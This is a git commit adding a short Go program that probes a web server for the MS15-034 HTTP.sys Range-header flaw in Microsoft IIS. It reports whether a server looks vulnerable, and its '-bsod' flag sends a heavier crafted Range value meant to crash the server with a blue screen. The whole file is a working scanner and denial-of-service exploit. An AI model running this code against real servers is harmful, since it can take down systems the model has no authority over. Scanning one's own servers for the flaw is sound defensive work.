09d628549da0eaf39a1eb437b892c08b19f11fce
Fabrício Godoy <skarllot@gmail.com>
2015-04-20 19:41:50 -0300

    New code to check MS15-034 vulnerability

---
+++ main.go
@@ -0,0 +1,60 @@
+package main
+
+import (
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"strings"
+)
+
+const (
+	RANGE_HEADER                 = "Range"
+	RANGE_LIGHT_TEST             = "bytes=0-18446744073709551615"
+	RANGE_HEAVY_TEST             = "bytes=20-18446744073709551615"
+	STATUS_RANGE_NOT_SATISFIABLE = 416
+	STATUS_INVALID_HEADER_NAME   = 400
+)
+
+func main() {
+	var host = flag.String("host", "http://example.com", "HTTP address to request")
+	var bsod = flag.Bool("bsod", false, "Set to force BSOD")
+	flag.Parse()
+
+	client := &http.Client{}
+	req, err := http.NewRequest("GET", *host, nil)
+	if err != nil {
+		fmt.Println("Request error:", err)
+		return
+	}
+	if *bsod {
+		req.Header.Add(RANGE_HEADER, RANGE_HEAVY_TEST)
+	} else {
+		req.Header.Add(RANGE_HEADER, RANGE_LIGHT_TEST)
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Println("Send request error:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	server := resp.Header.Get("Server")
+	if !strings.Contains(server, "Microsoft") {
+		fmt.Println("[*] Not IIS")
+		return
+	}
+
+	switch resp.StatusCode {
+	case STATUS_RANGE_NOT_SATISFIABLE:
+		fmt.Println("[!!] Looks vulnerable")
+	default:
+		fmt.Println("[*] Looks patched or unaffected")
+	}
+
+	if *bsod {
+		body, _ := ioutil.ReadAll(resp.Body)
+		fmt.Printf("%s\n", body)
+	}
+}
